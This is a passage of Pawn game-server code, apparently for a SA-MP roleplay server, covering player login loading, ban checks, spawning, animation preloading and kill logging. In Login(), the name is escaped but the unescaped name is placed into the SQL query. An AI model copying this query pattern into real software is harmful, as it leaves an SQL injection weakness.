					PlayerInfo[extraid][pLiveBanned] = strval(szReturn);

					// Free the result (of the entire player record) when we're done with loading it...
					// mysql_free_result(sqldb);

					if(PlayerInfo[extraid][pHospital] == 1) {
					    PlayerInfo[extraid][pHospital] = 0;
					    SetPVarInt(extraid, "MedicBill", 1);
					}

					TotalLogin++;
					GetPlayerIp(extraid, PlayerInfo[extraid][pIP], 16);
					if(PlayerInfo[extraid][pBanned] >= 1 || PlayerInfo[extraid][pPermaBanned] >= 1) {
						format(string, sizeof(string), "WARNING: %s (IP:%s) tried to login whilst banned and has been auto-banned.", GetPlayerNameEx(extraid), PlayerInfo[extraid][pIP]);
						ABroadCast(COLOR_YELLOW, string, 1);
						SendClientMessage(extraid, COLOR_NEWS, "You're banned from Next Generation Roleplay.");
						AddBan(PlayerInfo[extraid][pIP]);
						Log("logs/ban.log", string);
						return Kick(extraid);
					}

					if(PlayerInfo[extraid][pSprunk] > 10) {
					    format(string, sizeof(string), "You're carrying too much Sprunk. You now have 10 cans, and have been refunded $%d for your loss.", PlayerInfo[extraid][pSprunk] - 10);
						SendClientMessage(extraid, COLOR_GREY, string);

						PlayerInfo[extraid][pCash] += PlayerInfo[extraid][pSprunk] - 10;
						PlayerInfo[extraid][pSprunk] = 10;
					}

					if(PlayerInfo[extraid][pSmslog] >= 1) {
					    format(string, sizeof(string), "SMS logs have been removed, you have been refunded %d materials.", PlayerInfo[extraid][pSmslog] * 2000);
						SendClientMessage(extraid, COLOR_GREY, string);

                        PlayerInfo[extraid][pMats] += PlayerInfo[extraid][pSmslog] * 2000;
						PlayerInfo[extraid][pSmslog] = 0;
					}

			        if(PlayerInfo[extraid][pTut] == 1)
						PlayerPlaySound(extraid,SOUND_OFF,2050.1995, 1344.5500, 13.2378); //Music Off

					SetSpawnInfo(extraid, 0, PlayerInfo[extraid][pSkin], PlayerInfo[extraid][pPos_x], PlayerInfo[extraid][pPos_y], PlayerInfo[extraid][pPos_z], 1.0, -1, -1, -1, -1, -1, -1);

					gPlayerLogged[extraid] = 1;
					SpawnPlayer(extraid);
					SetPlayerScore(extraid, PlayerInfo[extraid][pLevel]);

					if(PlayerInfo[extraid][pTut] == 1) {
						HideMainMenuGUI(extraid);
						InsideTut[extraid] = 0;
					}

					if(PlayerInfo[extraid][pDisabled] != 0) {
						format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s has been auto kicked because their account is disabled.", GetPlayerNameEx(extraid));
				        ABroadCast(COLOR_YELLOW, string, 4);
					    SendClientMessage(extraid, COLOR_NEWS, "This account is disabled. Please contact us via the forum ("WEBSITE").");
					    return Kick(extraid);
					}

					if(PlayerInfo[extraid][pAdmin] < 0 || PlayerInfo[extraid][pAdmin] > 6) {
			   			new name[MAX_PLAYER_NAME];
						GetPlayerName(extraid, name, sizeof(name));
						format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s attempted to log in with Admin Level %d.", GetPlayerNameEx(extraid), PlayerInfo[extraid][pAdmin]);
						PlayerInfo[extraid][pAdmin] = 0;
				        ABroadCast(COLOR_YELLOW, string, 4);
						return Kick(extraid);
				    }

					if(PlayerInfo[extraid][pInt] > 0 || PlayerInfo[extraid][pVW] > 0) {
					    LoadObjectsForPlayer(extraid);
				    }

					SkinDelay(extraid);
					SetPlayerFightingStyle(extraid, PlayerInfo[extraid][pFightStyle]);
					SetPlayerToTeamColor(extraid);

					if(AdminLoggedInBefore[extraid] == 0) {
						if(PlayerInfo[extraid][pTut] == 1) {
							format(string, sizeof(string), "Welcome to Next Generation Roleplay, %s.", GetPlayerNameEx(extraid));
							SendClientMessage(extraid, COLOR_NEWS, string);
						}

						if(PlayerInfo[extraid][pAdmin] > 0 && PlayerInfo[extraid][pTut] == 1) {
							format(string, sizeof(string), "You have logged in as Level %d Admin.",PlayerInfo[extraid][pAdmin]);
							SendClientMessage(extraid, COLOR_WHITE,string);

							if(strlen(PlayerInfo[extraid][pAdminName]) > 2 && strlen(PlayerInfo[extraid][pAdminName]) < 20) {
								format(string, sizeof(string), "%s (%s) has logged in as Level %d Admin.", GetPlayerNameEx(extraid), PlayerInfo[extraid][pAdminName], PlayerInfo[extraid][pAdmin]);
							}
							else {
								format(string, sizeof(string), "%s (unset admin name) has logged in as Level %d Admin.", GetPlayerNameEx(extraid), PlayerInfo[extraid][pAdmin]);
							}

							foreach(Player, i) {
								if(PlayerInfo[i][pAdmin] >= 5 && PlayerInfo[i][pAdmin] >= PlayerInfo[extraid][pAdmin] && i != extraid) {
									SendClientMessage(i, COLOR_WHITE, string);
								}
							}
						}
						if(PlayerInfo[extraid][pTut] == 1) {
							format(string, sizeof(string), "~w~Welcome~n~~y~%s", GetPlayerNameEx(extraid));
							GameTextForPlayer(extraid, string, 5000, 1);

							new motdstring[128];
							format(motdstring, sizeof(motdstring), "News: %s", GlobalMOTD);
							SendClientMessage(extraid, COLOR_WHITE, motdstring);

							new amotdstring[128];
							format(amotdstring, sizeof(amotdstring), "Admin News: %s", AdminMOTD);
							if(PlayerInfo[extraid][pAdmin] > 0)  SendClientMessage(extraid, COLOR_YELLOW, amotdstring);
						}
						if(PlayerInfo[extraid][pGang] < 255 && PlayerInfo[extraid][pTut] == 1) {
							format(string, sizeof(string), "Family MOTD: %s.", FamilyInfo[PlayerInfo[extraid][pGang]][FamilyMOTD]);
							SendClientMessage(extraid, COLOR_YELLOW, string);
						}
						if(!isnull(PlayerInfo[extraid][pFlag])) {
							format(string, sizeof(string), "%s has an outstanding flag.", GetPlayerNameEx(extraid));
							ABroadCast(COLOR_WHITE, string, 1);
				  		}
				  		if(PlayerInfo[extraid][pRefTokensOffline] != 0) {
				  		    format(string, sizeof(string), "You have gained %d referral token(s) while you were offline. Use /refshop to spend them.", PlayerInfo[extraid][pRefTokensOffline]);
				  		    SendClientMessage(extraid, COLOR_YELLOW, string);
				  		    PlayerInfo[extraid][pRefTokens] += PlayerInfo[extraid][pRefTokensOffline];
				  		    PlayerInfo[extraid][pRefTokensOffline] = 0;
				  		}
			   			if(PlayerInfo[extraid][pJob2] >= 1 && PlayerInfo[extraid][pVip] < 2 && PlayerInfo[extraid][pLevel] < 25) {
							PlayerInfo[extraid][pJob2] = 0;
							SendClientMessage(extraid, COLOR_YELLOW, "You have lost your secondary job due to the fact that you no longer have a VIP package or are below level 25.");
						}
					}

					/* --------- Load alternative player items (vehicles, toys, etc) --------- */
					LoadPlayerDynamicItems(extraid);
					// format(szQuery, sizeof(szQuery), "UPDATE connections SET AccountID = %d WHERE PlayerID = %d", PlayerInfo[extraid][pID], extraid);
					// mysql_tquery(szQuery, THREAD_NO_RESULT, extraid,sqldb);

					if(PlayerInfo[extraid][pWeedObject] != 0) {
						PlayerInfo[extraid][pWeedObject] = CreateDynamicObject(3409, PlayerInfo[extraid][pWeedPos][0], PlayerInfo[extraid][pWeedPos][1], PlayerInfo[extraid][pWeedPos][2], 0.0, 0.0, 0.0, PlayerInfo[extraid][pWeedVW], PlayerInfo[extraid][pWeedInt]);
					}

			 		new
						iCheckOne = INVALID_HOUSE_ID,
						iCheckTwo = INVALID_HOUSE_ID,
						szPlayerName[MAX_PLAYER_NAME];

					GetPlayerName(extraid, szPlayerName, sizeof(szPlayerName));

					for(new i = 0; i < MAX_HOUSES; ++i) if(strcmp(szPlayerName, HouseInfo[i][hOwner], false) == 0) {
						if(iCheckOne != INVALID_HOUSE_ID) iCheckTwo = i;
						else if(iCheckTwo == INVALID_HOUSE_ID) iCheckOne = i;
						else break;
					}

					if(iCheckOne != INVALID_HOUSE_ID)
						PlayerInfo[extraid][pHouse] = iCheckOne;
					else PlayerInfo[extraid][pHouse] = INVALID_HOUSE_ID;

					if(iCheckTwo != INVALID_HOUSE_ID)
						PlayerInfo[extraid][pHouse2] = iCheckTwo;
					else PlayerInfo[extraid][pHouse2] = INVALID_HOUSE_ID;

					if(PlayerInfo[extraid][pRenting] != INVALID_HOUSE_ID && (PlayerInfo[extraid][pHouse] != INVALID_HOUSE_ID || PlayerInfo[extraid][pHouse2] != INVALID_HOUSE_ID)) {
						PlayerInfo[extraid][pRenting] = INVALID_HOUSE_ID;
					}
				}
			} // mysql_free_result(sqldb); // The player logged off before we could get their result, so we need to free it.
		}
	}
	return 1;
}

forward Login(playerid);
public Login(playerid)
{
	// Display the main menu
	ShowMainMenuGUI(playerid);
	ClearChatbox(playerid);
	SetPlayerVirtualWorld(playerid, 0);

    SetPlayerCameraPos(playerid, 2022.083740, -1308.260620, 80.478797);
    SetPlayerCameraLookAt(playerid, 1970.506103, -1201.447143, 25.596593);

	new
	    szQuery[128],
	    szPlayerName[MAX_PLAYER_NAME],
		szPlayerName2[MAX_PLAYER_NAME];

	GetPlayerName(playerid, szPlayerName, sizeof(szPlayerName));

	mysql_escape_string(szPlayerName, szPlayerName2,MAX_PLAYER_NAME,sqldb);

	// Check MySQL to see if any accounts exist with the specified username on login.
	mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT COUNT(*) FROM players WHERE Username = '%s'", szPlayerName);
	mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii",THREAD_CONFIRM_USERNAME, playerid);

	//ConnectionLog(playerid, PlayerInfo[playerid][pID], szPlayerName);
	return 1;
}

stock PreloadAnimLib(playerid, animlib[]) {
	return ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
}

stock PreloadAnims(playerid) {
	ApplyAnimation(playerid, "AIRPORT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "Attractors", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BAR", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BASEBALL", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BD_FIRE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BEACH", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "benchpress", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BF_injection", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BIKED", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BIKEH", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BIKELEAP", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BIKES", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BIKEV", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BIKE_DBZ", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BMX", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BOMBER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BOX", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BSKTBALL", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BUDDY", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BUS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CAMERA", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CAR", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CARRY", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CAR_CHAT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CASINO", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CHAINSAW", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CHOPPA", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CLOTHES", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "COACH", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "COLT45", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "COP_AMBIENT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "COP_DVBYZ", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CRACK", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CRIB", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DAM_JUMP", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DANCING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DEALER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DILDO", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DODGE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DOZER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DRIVEBYS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FAT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FIGHT_B", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FIGHT_C", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FIGHT_D", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FIGHT_E", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FINALE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FINALE2", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FLAME", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "Flowers", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FOOD", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "Freeweights", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GANGS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GHANDS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GHETTO_DB", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "goggles", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GRAFFITI", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GRAVEYARD", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GRENADE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GYMNASIUM", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "HAIRCUTS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "HEIST9", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "INT_HOUSE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "INT_OFFICE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "INT_SHOP", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "JST_BUISNESS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "KART", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "KISSING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "KNIFE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "LAPDAN1", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "LAPDAN2", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "LAPDAN3", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "LOWRIDER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MD_CHASE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MD_END", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MEDIC", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MISC", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MTB", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MUSCULAR", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "NEVADA", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "ON_LOOKERS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "OTB", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PARACHUTE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PARK", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PAULNMAC", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "ped", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PLAYER_DVBYS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PLAYIDLES", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "POLICE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "POOL", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "POOR", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PYTHON", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "QUAD", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "QUAD_DBZ", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "RAPPING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "RIFLE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "RIOT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "ROB_BANK", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "RUSTLER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "RYDER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SCRATCHING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SHAMAL", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SHOP", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SHOTGUN", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SILENCED", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SKATE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SMOKING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SNIPER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SPRAYCAN", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "STRIP", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SUNBATHE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SWAT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SWEET", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SWIM", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SWORD", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "TANK", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "TATTOOS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "TEC", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "TRAIN", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "TRUCK", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "UZI", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "VAN", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "VENDING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "VORTEX", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "WAYFARER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "WEAPONS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "WUZI", "null", 0.0, 0, 0, 0, 0, 0);

	return 1;
}

forward RespawnVehicleFunction(vehicleid);
public RespawnVehicleFunction(vehicleid) {
	return SetVehicleToRespawn(vehicleid);
}

public OnPlayerSpawn(playerid) {
	PreloadAnims(playerid);

	SetPlayerTeam(playerid, -1);

	if(!gPlayerLogged[playerid])
    {// The player doesn't actually spawn before logging in, this is just to get rid of the annoying "<<", ">>" and "Spawn" buttons in the login/registration screen.
        TogglePlayerControllable(playerid, 0);
        return 1;
	}
	if(InsideShamal[playerid] != INVALID_VEHICLE_ID)
	{
		SetPlayerPos(playerid, GetPVarFloat(playerid, "air_Xpos"), GetPVarFloat(playerid, "air_Ypos"), GetPVarFloat(playerid, "air_Zpos"));
		SetPlayerFacingAngle(playerid, GetPVarFloat(playerid, "air_Rpos"));
		SetPlayerHealth(playerid, GetPVarFloat(playerid, "air_HP"));
		SetPlayerArmourEx(playerid, GetPVarFloat(playerid, "air_Arm"));
		SetPlayerWeaponsEx(playerid);
		SetPlayerToTeamColor(playerid);
		SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);

		DeletePVar(playerid, "air_Xpos");
		DeletePVar(playerid, "air_Ypos");
		DeletePVar(playerid, "air_Zpos");
		DeletePVar(playerid, "air_Rpos");
		DeletePVar(playerid, "air_HP");
		DeletePVar(playerid, "air_Arm");

		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, InsideShamal[playerid]);
		return SetPlayerInterior(playerid, 1);
	}

    Streamer_Update(playerid);

    if(IsPlayerNPC(playerid)) return 1;
	SetPlayerWantedLevel(playerid, PlayerInfo[playerid][pWantedLevel]);
	DeletePVar(playerid, "STD");

	SetCameraBehindPlayer(playerid);
	SetPlayerSpawn(playerid);
	SetPlayerWeapons(playerid);
	SetPlayerToTeamColor(playerid);

	SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, 1);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_MICRO_UZI, 1);
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason) {
	new
		string[128];

	if(IsPlayerConnected(killerid)) {
		new
			hour,
			minute,
			second,
			weaponname[32];

		gettime(hour,minute,second);
		FixHour(hour);
		hour = shifthour;
		GetWeaponName(reason, weaponname, sizeof(weaponname));

		new
			szQuery[225];

	    if(GetPVarInt(playerid, "PBM") > 0 && GetPVarInt(killerid, "PBM") > 0) {
        	SetPVarInt(killerid, "PBMK", GetPVarInt(killerid, "PBMK")+1);
        	SetPVarInt(playerid, "PBMD", GetPVarInt(playerid, "PBMD")+1);

        	SetPVarInt(playerid, "PBMS", GetPVarInt(playerid, "PBMS")-5);
        	SetPVarInt(killerid, "PBMS", GetPVarInt(killerid, "PBMS")+10);
			if(reason == 0) format(string, sizeof(string), "%s has killed %s, with their fists in the paintball game.", GetPlayerNameEx(killerid), GetPlayerNameEx(playerid));
			else format(string, sizeof(string), "%s has killed %s, with a %s in the paintball game.", GetPlayerNameEx(killerid), GetPlayerNameEx(playerid), weaponname);
			foreach(Player, i) {
			    if(GetPVarInt(playerid, "PBM") == GetPVarInt(i, "PBM"))
			        SendClientMessage(i, COLOR_RED, string);
			}
		}
			
			// format(PlayerInfo[playerid][pKillLog9], 128, "%s", PlayerInfo[playerid][pKillLog8]);
			// format(PlayerInfo[playerid][pKillLog8], 128, "%s", PlayerInfo[playerid][pKillLog7]);
			// format(PlayerInfo[playerid][pKillLog7], 128, "%s", PlayerInfo[playerid][pKillLog6]);
			// format(PlayerInfo[playerid][pKillLog6], 128, "%s", PlayerInfo[playerid][pKillLog5]);
			// format(PlayerInfo[playerid][pKillLog5], 128, "%s", PlayerInfo[playerid][pKillLog4]);
			// format(PlayerInfo[playerid][pKillLog4], 128, "%s", PlayerInfo[playerid][pKillLog3]);
			// format(PlayerInfo[playerid][pKillLog3], 128, "%s", PlayerInfo[playerid][pKillLog2]);
			// format(PlayerInfo[playerid][pKillLog2], 128, "%s", PlayerInfo[playerid][pKillLog1]);
			// format(PlayerInfo[playerid][pKillLog1], 128, "%s", PlayerInfo[playerid][pKillLog0]);
			// format(PlayerInfo[playerid][pKillLog0], 128, "(%d:%d:%d) %s killed me with %s (in paintball)", hour,minute,second,GetPlayerNameEx(killerid), weaponname);

			// format(PlayerInfo[killerid][pKillLog9], 128, "%s", PlayerInfo[killerid][pKillLog8]);
			// format(PlayerInfo[killerid][pKillLog8], 128, "%s", PlayerInfo[killerid][pKillLog7]);
			// format(PlayerInfo[killerid][pKillLog7], 128, "%s", PlayerInfo[killerid][pKillLog6]);
			// format(PlayerInfo[killerid][pKillLog6], 128, "%s", PlayerInfo[killerid][pKillLog5]);
			// format(PlayerInfo[killerid][pKillLog5], 128, "%s", PlayerInfo[killerid][pKillLog4]);
			// format(PlayerInfo[killerid][pKillLog4], 128, "%s", PlayerInfo[killerid][pKillLog3]);
			// format(PlayerInfo[killerid][pKillLog3], 128, "%s", PlayerInfo[killerid][pKillLog2]);
			// format(PlayerInfo[killerid][pKillLog2], 128, "%s", PlayerInfo[killerid][pKillLog1]);
			// format(PlayerInfo[killerid][pKillLog1], 128, "%s", PlayerInfo[killerid][pKillLog0]);
		 	// format(PlayerInfo[killerid][pKillLog0], 128, "(%d:%d:%d) %s killed %s with %s (in paintball)", hour,minute,second, GetPlayerNameEx(killerid), GetPlayerNameEx(playerid), weaponname);

		 	// mysql_format(sqldb,szQuery, sizeof(szQuery), "INSERT INTO kills (killerID, killedID, killTS, killText) VALUES(%d, %d, %d, '%s')", PlayerInfo[killerid][pID], PlayerInfo[playerid][pID], gettime(), PlayerInfo[killerid][pKillLog0]);
		 	// mysql_tquery(sqldb,szQuery);
	    else if(GetPVarInt(playerid, "EventToken") > 0)
		{
			format(PlayerInfo[playerid][pKillLog9], 128, "%s", PlayerInfo[playerid][pKillLog8]);
			format(PlayerInfo[playerid][pKillLog8], 128, "%s", PlayerInfo[playerid][pKillLog7]);
			format(PlayerInfo[playerid][pKillLog7], 128, "%s", PlayerInfo[playerid][pKillLog6]);
			format(PlayerInfo[playerid][pKillLog6], 128, "%s", PlayerInfo[playerid][pKillLog5]);
			format(PlayerInfo[playerid][pKillLog5], 128, "%s", PlayerInfo[playerid][pKillLog4]);
			format(PlayerInfo[playerid][pKillLog4], 128, "%s", PlayerInfo[playerid][pKillLog3]);
			format(PlayerInfo[playerid][pKillLog3], 128, "%s", PlayerInfo[playerid][pKillLog2]);
			format(PlayerInfo[playerid][pKillLog2], 128, "%s", PlayerInfo[playerid][pKillLog1]);
			format(PlayerInfo[playerid][pKillLog1], 128, "%s", PlayerInfo[playerid][pKillLog0]);
			format(PlayerInfo[playerid][pKillLog0], 128, "(%d:%d:%d) %s killed me with %s (in event)", hour,minute,second,GetPlayerNameEx(killerid), weaponname);

			format(PlayerInfo[killerid][pKillLog9], 128, "%s", PlayerInfo[killerid][pKillLog8]);
			format(PlayerInfo[killerid][pKillLog8], 128, "%s", PlayerInfo[killerid][pKillLog7]);
			format(PlayerInfo[killerid][pKillLog7], 128, "%s", PlayerInfo[killerid][pKillLog6]);
			format(PlayerInfo[killerid][pKillLog6], 128, "%s", PlayerInfo[killerid][pKillLog5]);
			format(PlayerInfo[killerid][pKillLog5], 128, "%s", PlayerInfo[killerid][pKillLog4]);
			format(PlayerInfo[killerid][pKillLog4], 128, "%s", PlayerInfo[killerid][pKillLog3]);
			format(PlayerInfo[killerid][pKillLog3], 128, "%s", PlayerInfo[killerid][pKillLog2]);
			format(PlayerInfo[killerid][pKillLog2], 128, "%s", PlayerInfo[killerid][pKillLog1]);
			format(PlayerInfo[killerid][pKillLog1], 128, "%s", PlayerInfo[killerid][pKillLog0]);
		 	format(PlayerInfo[killerid][pKillLog0], 128, "(%d:%d:%d) %s killed %s with %s (in event)", hour,minute,second, GetPlayerNameEx(killerid), GetPlayerNameEx(playerid), weaponname);

		 	mysql_format(sqldb,szQuery, sizeof(szQuery), "INSERT INTO kills (killerID, killedID, killTS, killText) VALUES(%d, %d, %d, '%s')", PlayerInfo[killerid][pID], PlayerInfo[playerid][pID], gettime(), PlayerInfo[killerid][pKillLog0]);
		 	mysql_tquery(sqldb,szQuery);
	    }
		else
		{
			format(PlayerInfo[playerid][pKillLog9], 128, "%s", PlayerInfo[playerid][pKillLog8]);
			format(PlayerInfo[playerid][pKillLog8], 128, "%s", PlayerInfo[playerid][pKillLog7]);
			format(PlayerInfo[playerid][pKillLog7], 128, "%s", PlayerInfo[playerid][pKillLog6]);
			format(PlayerInfo[playerid][pKillLog6], 128, "%s", PlayerInfo[playerid][pKillLog5]);
			format(PlayerInfo[playerid][pKillLog5], 128, "%s", PlayerInfo[playerid][pKillLog4]);
			format(PlayerInfo[playerid][pKillLog4], 128, "%s", PlayerInfo[playerid][pKillLog3]);
			format(PlayerInfo[playerid][pKillLog3], 128, "%s", PlayerInfo[playerid][pKillLog2]);
			format(PlayerInfo[playerid][pKillLog2], 128, "%s", PlayerInfo[playerid][pKillLog1]);
